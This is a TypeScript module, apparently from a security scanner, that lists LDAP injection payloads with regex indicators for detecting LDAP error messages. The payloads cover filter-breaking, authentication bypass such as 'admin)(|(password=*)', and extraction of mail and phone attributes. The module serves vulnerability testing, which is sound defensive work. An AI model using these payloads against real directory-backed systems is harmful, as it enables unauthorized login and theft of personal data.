/**
 * LDAP Injection payloads (CWE-90).
 *
 * LDAP injection targets authentication forms and search functionality
 * that constructs LDAP queries from user input. Common in enterprise
 * apps using Active Directory, OpenLDAP, or other directory services.
 *
 * Detection approach: send payloads that cause LDAP syntax errors or
 * modify query logic, then look for error messages or behavioral changes.
 */

export interface LdapPayload {
  payload: string;
  technique: string;
  /** What to look for in the response */
  indicator: RegExp;
  /** Whether this is a boolean-blind test (compare baseline vs payload response) */
  blind: boolean;
}

// ─── Error Patterns ────────────────────────────────────────────────────

/** Patterns that confirm the server is processing LDAP queries */
export const LDAP_ERROR_PATTERNS = [
  /ldap.*error|ldap.*exception/i,
  /invalid.*dn|invalid.*filter/i,
  /javax\.naming\.NamingException/i,
  /com\.sun\.jndi\.ldap/i,
  /LDAP.*syntax|filter.*syntax/i,
  /bad search filter/i,
  /UnsolicitedNotificationException/i,
  /LdapErr:.*DSID/i,                    // Active Directory
  /referral.*ldap/i,
  /ldap_search|ldap_bind|ldap_connect/i, // PHP LDAP functions
  /Net::LDAP|Net::LDAPS/i,              // Perl/Ruby LDAP
  /ldap3\.|python-ldap/i,               // Python LDAP
  /Invalid DN syntax/i,
  /object class violation/i,
  /no such object/i,
  /operations error/i,
  /unwilling to perform/i,
];

export function detectLdapError(responseBody: string): { detected: boolean; pattern: string } {
  for (const pattern of LDAP_ERROR_PATTERNS) {
    if (pattern.test(responseBody)) {
      return { detected: true, pattern: pattern.source };
    }
  }
  return { detected: false, pattern: '' };
}

// ─── Payloads ──────────────────────────────────────────────────────────

export const LDAP_PAYLOADS: LdapPayload[] = [
  // ── Syntax-breaking payloads (trigger errors) ──
  {
    payload: '*)(objectClass=*',
    technique: 'wildcard-filter-break',
    indicator: /ldap|filter|syntax|naming|jndi|DN/i,
    blind: false,
  },
  {
    payload: '*)(&',
    technique: 'unclosed-and-operator',
    indicator: /ldap|filter|syntax|naming|jndi|bad.*filter/i,
    blind: false,
  },
  {
    payload: '*)(|(&',
    technique: 'nested-operator-break',
    indicator: /ldap|filter|syntax|naming|jndi/i,
    blind: false,
  },
  {
    payload: '\\28',
    technique: 'escaped-parenthesis',
    indicator: /ldap|filter|syntax|naming/i,
    blind: false,
  },

  // ── Authentication bypass payloads ──
  {
    payload: '*',
    technique: 'wildcard-bypass',
    indicator: /.*/, // Check for auth bypass (200 + token)
    blind: true,
  },
  {
    payload: 'admin)(&)',
    technique: 'tautology-and',
    indicator: /.*/,
    blind: true,
  },
  {
    payload: 'admin)(|(password=*)',
    technique: 'or-password-wildcard',
    indicator: /.*/,
    blind: true,
  },
  {
    payload: '*)(uid=*))(|(uid=*',
    technique: 'filter-injection',
    indicator: /.*/,
    blind: true,
  },

  // ── Information disclosure payloads ──
  {
    payload: '*)(mail=*',
    technique: 'attribute-extraction-mail',
    indicator: /@.*\./,  // Email pattern in response
    blind: true,
  },
  {
    payload: '*)(telephoneNumber=*',
    technique: 'attribute-extraction-phone',
    indicator: /\+?\d[\d\-\s]{7,}/,  // Phone number pattern
    blind: true,
  },
];

/** Parameter names commonly used in LDAP-backed search/auth */
export const LDAP_PARAM_PATTERNS =
  /^(username|user|uid|cn|sn|dn|login|name|search|query|q|filter|account|email|samaccountname|userprincipalname|sAMAccountName)$/i;
